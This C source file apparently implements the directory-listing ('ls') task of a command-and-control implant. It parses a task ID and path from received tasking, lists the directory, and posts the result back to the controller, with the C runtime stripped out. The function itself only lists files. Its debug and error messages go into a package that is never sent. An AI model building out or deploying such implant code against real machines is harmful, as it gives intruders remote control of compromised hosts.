#include "WrapLs.h"
#include "BaseLs.h"

// Removed <cstdio> and <typeinfo> as per requirements

BOOL wrapLs(PParser arguments)
{
    SIZE_T uuidLength = 36;
    PCHAR taskUuid = getString(arguments, &uuidLength);
    UINT32 nbArg = getInt32(arguments);
    SIZE_T size = 0;
    PCHAR path = getString(arguments, &size);

    // Reallocate memory for path without using C/C++ standard libraries
    path = (PCHAR)LocalReAlloc(path, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
    

    // Initialize response and output packages
    PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
    addString(responseTask, taskUuid, FALSE);
    PPackage output = newPackage(0, FALSE);

    // Construct debug messages without using printf and typeid
    char listingMsg[256];
    listingMsg[0] = '\0';
    CustomStrCopy(listingMsg, "[LS] Listing directory: ", sizeof(listingMsg));
    CustomStrCat(listingMsg, path, sizeof(listingMsg));
    CustomStrCat(listingMsg, "\n", sizeof(listingMsg));
    addString(output, listingMsg, FALSE);

    // Convert size (SIZE_T) to string manually
    char sizeMsg[256];
    sizeMsg[0] = '\0';
    CustomStrCopy(sizeMsg, "[LS] Length of path variable: ", sizeof(sizeMsg));

    // Simple integer to string conversion (assuming size fits in 64 bits)
    char sizeStr[32];
    SIZE_T tempSize = size;
    int index = 0;
    if (tempSize == 0)
    {
        sizeStr[index++] = '0';
    }
    else
    {
        char tmp[32];
        int tmpIndex = 0;
        while (tempSize > 0 && tmpIndex < (int)(sizeof(tmp) - 1))
        {
            tmp[tmpIndex++] = '0' + (tempSize % 10);
            tempSize /= 10;
        }
        // Reverse the digits
        for (int i = tmpIndex - 1; i >= 0; --i)
        {
            sizeStr[index++] = tmp[i];
        }
    }
    sizeStr[index] = '\0';
    CustomStrCat(sizeMsg, sizeStr, sizeof(sizeMsg));
    CustomStrCat(sizeMsg, "\n", sizeof(sizeMsg));
    addString(output, sizeMsg, FALSE);

    // Replace typeid(path).name() with a static string since typeinfo is removed
    char typeMsg[256];
    CustomStrCopy(typeMsg, "[LS] Type of path variable: char*\n", sizeof(typeMsg));
    addString(output, typeMsg, FALSE);

    // Execute the LS command
    #define MAX_RESULT_SIZE 4096
    char result[MAX_RESULT_SIZE];
    result[0] = '\0'; // Initialize the result string
    BOOL success = baseLs(path, result, MAX_RESULT_SIZE);

    if (!success)
    {
        // Add an error message without using snprintf
        char errorMsg[256];
        errorMsg[0] = '\0';
        CustomStrCopy(errorMsg, "[LS] Error listing files in directory => ", sizeof(errorMsg));
        CustomStrCat(errorMsg, path, sizeof(errorMsg));
        CustomStrCat(errorMsg, "!\n", sizeof(errorMsg));
        addString(output, errorMsg, FALSE);
    }
    else
    {
        // Add the result to the output package without using std::string
        addBytes(responseTask, (PBYTE)result, CustomStrLen(result), TRUE);
    }

    // Send the output package
    sendPackage(responseTask);

    // Clean up
    LocalFree(path);

    return success;
}